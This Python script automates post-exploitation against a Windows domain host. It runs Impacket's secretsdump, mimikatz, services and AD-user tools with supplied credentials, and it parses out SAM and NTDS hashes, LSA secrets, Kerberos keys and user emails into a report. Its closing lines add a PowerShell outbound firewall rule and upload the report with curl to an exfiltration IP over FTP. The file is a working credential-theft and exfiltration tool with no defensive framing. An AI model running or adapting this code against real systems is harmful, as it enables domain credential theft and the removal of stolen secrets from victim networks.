import argparse
import socket
import os
import re

# Setup arg passing
parser = argparse.ArgumentParser("", formatter_class=argparse.RawTextHelpFormatter)
req_args = parser.add_argument_group('required arguments')

req_args.add_argument('-d', '--domain', help='The domain', required=True)
req_args.add_argument('-u', '--username', help='The username', required=True)
req_args.add_argument('-p', '--password', help='The password', required=True)

args = parser.parse_args()

# Set up variables and functions
domain = args.domain
username = args.username
password = args.password
validExfilIP = False
validTargetIP = False
targetIP = None
secretsdump_path = './impacket/examples/secretsdump.py'
mimikatz_path = './impacket/examples/mimikatz.py'
services_path = './impacket/examples/services.py'
getADUsers_path = './impacket/examples/getADUsers.py'
dumpNTMLInfo_path = './impacket/examples/DumpNTLMInfo.py'

# Getting the AD Users requires the full DNS domain name, we can get this out of the NTLM dump.
def get_domain_name(filepath):
    full_domain_name = ""
    try:
        with open(filepath, 'r') as f:
            for line in f:
                if "DNS Domain Name" in line:
                    extra, full_domain_name = line.split(':', 1)
                    full_domain_name = full_domain_name.strip()
                    break
    except FileNotFoundError:
        print("NTML Output file not found.")
    except Exception as e:
        print(f"An error occurred: {e}")
    return full_domain_name

# Read mimikatz output and find where there are RID and User lines, if there are both then there is a chance the following
# Line will be an NTLM Hash, even without the NTLM hash, this still indicates what users are on the machine.

def get_NTLM_hash(filepath):
    try:
        with open(filepath, 'r') as f, open('./output.txt', 'a') as of:
            of.write(f"Mimikatz output:\n")
            for line in f:
                if line.strip().startswith('RID  :') or line.strip().startswith('User :'):
                    of.write(line.strip() + "\n")
                elif '  Hash NTLM:' in line:
                    of.write(line.strip() + '\n\n')
    except Exception as e:
        print(f"An error occurred extracting the NTLM info: {e}")

# The following function will process the output of the secretsdump script, this file can vary from machine to machine.
# We use start and end flags that are consistent in the output. If they don't appear then we do not include the flag
# in the output.

def process_secrets_dump(filepath):
    start_sam = "[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)"
    end_sam = "[*] Dumping cached domain logon information (domain/username:hash)"

    start_lsa = "[*] Dumping LSA Secrets"
    end_lsa = "[*] NL$KM"

    start_domain = "[*] Using the DRSUAPI method to get NTDS.DIT secrets"
    end_domain = "[*] Kerberos keys grabbed"
    end_kerberos = "[*] Cleaning up..."

    sam_flag = False
    lsa_flag = False
    domain_flag = False
    kerberos_flag = False

    sam_hashes = []
    lsa_hashes = []
    domain_hashes = []
    kerberos_info = []

    # Read the input file
    with open(filepath, 'r') as file:
        for line in file:
            # Check for start and end of SAM segment
            if line.strip() == start_sam:
                sam_flag = True # change the flag to true
                continue # skips the header line.
            elif line.strip() == end_sam:
                sam_flag = False

            # If the flag is true, we append the lines to the array until the end flag is found,
            # When the end flag is found it sets type flag to False, this will stop appending to the array.

            # Check for start and end of LSA segment
            if line.strip() == start_lsa:
                lsa_flag = True
                continue
            elif line.strip() == end_lsa:
                lsa_flag = False

            # Check for start and end of domain segment
            if line.strip() == start_domain:
                domain_flag = True
                continue
            elif line.strip() == end_domain:
                domain_flag = False

            #Check for start and end of kerberos segment
            if line.strip() == end_domain:
                kerberos_flag = True
                continue
            elif line.strip() == end_kerberos:
                kerberos_flag = False

            if sam_flag:
                sam_hashes.append(line.strip())
            elif lsa_flag:
                lsa_hashes.append(line.strip())
            elif domain_flag:
                domain_hashes.append(line.strip())
            elif kerberos_flag:
                kerberos_info.append(line.strip())

    # We open the output file as write, as this is the first entry to final output report text file.
    # If the hashes array has an entry in it, we write the header then the contents of the array.
    try:
        with open('./output.txt', 'w') as of:
            if sam_hashes:
                of.write("Local SAM Hashes:\n")
            for hash in sam_hashes:
                of.write(f"{hash}\n")
            if lsa_hashes:
                of.write("\nLSA Secrets:\n")
            for lsahash in lsa_hashes:
                of.write(f"{lsahash}\n")
            if domain_hashes:
                of.write("\nDomains:\n")
            for domainhash in domain_hashes:
                of.write(f"{domainhash}\n")
            if kerberos_info:
                of.write("\nKerberos keys:\n")
            for key in kerberos_info:
                of.write(f"{key}\n")
            of.write(f"\n")
    # Handle any errors and output this, so the user knows.
    except Exception as e:
        print(f"Error: {e}")

# Interpret the AD users output file. We use regex here to get the start of the file.
# After this, we get all parts of the line into the array by using .split(), this will create entry depending on
# Whitespace. The script then opens output.txt in append and writes the username and email address.
# This function wouldn't be able to detect if a username has a space in it however, this should be addressed in future.
def get_ad_users(filepath):
    pattern = r"(-+(\s+-+)+)"
    all_info = []
    found_start = False
    with open(filepath, 'r') as file:
        for line in file:
            if re.match(pattern, line):
                found_start = True
                continue
            if found_start is True:
                all_info.append((line.split()))
    with open('./output.txt', 'a') as of:
        of.write(f"\nAD user info:\n")
        for info in all_info:
            of.write(f"User:\n")
            of.write(f"{info[0]}\n")
            for item in info:
                if "@" in item:
                    of.write(f"   {info[0]}'s email: {item}\n")
                    break

# This function interprets the output of the services script. We only append services that are running to
# the services array. Additionally, before this is appended to the output file we remove most of the whitespaces
# to help readability in the final file.

def get_services(filepath):
    start_string = "[*] Listing services available on target"
    found_start = False
    services = []
    with open(filepath, 'r') as file:
        for line in file:
            if start_string in line:
                found_start = True
                continue
            if found_start is True:
                if "RUNNING" in line.strip():
                    services.append(line.strip())
    with open('./output.txt', 'a') as of:
        of.write(f"\nRunning Services:\n")
        of.write(f"Service name - Service description\n")
        for service in services:
            service = (re.sub(r'\s+', ' ', service)).strip(" - RUNNING")
            of.write(f"{service}\n")
        of.write("\n")

# Get the IP of the target machine.
while not validTargetIP:
    targetIP = input("Enter the IP of the target system\n")
    # See if the IP is in a valid format.
    try:
        socket.inet_aton(targetIP)
        validTargetIP = True
    except socket.error:
        print("The target IP you entered is not valid, please try again.\n")


# Find out if the report should be exfiltrated
exfilBool = input("Would you like the generated report to be exfiltrated to an external domain? (y/n)\n")

while exfilBool.lower() != "y" and exfilBool.lower() != "n":
    exfilBool = input("Incorrect input detected, please try again (y/n)\n")

if exfilBool.lower() == "y":
    exfilBool = True
else:
    exfilBool = False

# Run the secretsdump script, saves to file
secCommand = f"py {secretsdump_path} {domain}/{username}:{password}@{targetIP} > .\\secOutput.txt"

os.system(secCommand)

# Use the process function and see if it works to filter out useless info. Needs input path
process_secrets_dump("./secOutput.txt")

# Dump the NTLM Info and filter the output.
dumpNTLMCommand = f"py {dumpNTMLInfo_path} {targetIP} > .\\NTLMInfo.txt"
os.system(dumpNTLMCommand)

# Assign the domain name to a variable for later use.
domain_name = get_domain_name("./NTLMInfo.txt")

# Run the mimikatz script, this uses command.txt which elevates the token and does a lsadump
# and call the function to filter the output
mimiCommand = f"py {mimikatz_path} -f ./command.txt "\
              f"{domain}/{username}:{password}@{targetIP} > .\\mimiOutput.txt"
os.system(mimiCommand)

# Extract key info to output text file.
get_NTLM_hash(".\\mimiOutput.txt")

# Run ADUsers script and filter the output
ADUsersCommand = (f"py {getADUsers_path} -all -dc-ip {targetIP} {domain_name}/{username}:{password}"
                  f" > .\\ADUsersOutput.txt")
os.system(ADUsersCommand)
get_ad_users(".\\ADUsersOutput.txt")


# Run services.py script.
servicesCommand = f"py {services_path} {domain}/{username}:{password}@{targetIP} list > .\\servicesOutput.txt"
os.system(servicesCommand)
get_services(".\\servicesOutput.txt")

# Upload the final output file to the exfil IP.
while exfilBool and not validExfilIP:
    # Get the exfil IP and check if it is in a valid format.
    exfilIP = input("Enter the IP you wish to exfiltrate the report to via FTP.\n")
    try:
        socket.inet_aton(exfilIP)
        validExfilIP = True
    except socket.error:
        print("The IP address entered was not valid, please try again.\n")
    # Add outbound firewall rule for FTP and upload the final report file.
    os.system("powershell New-NetFirewallRule -DisplayName 'FTP-Outbound' -Profile @('Domain', 'Private', 'Public')"
              " -Direction Outbound -Action Allow -Protocol TCP -LocalPort @(21)")
    os.system(f"curl -T output.txt ftp://{exfilIP}/ --user upload:''")
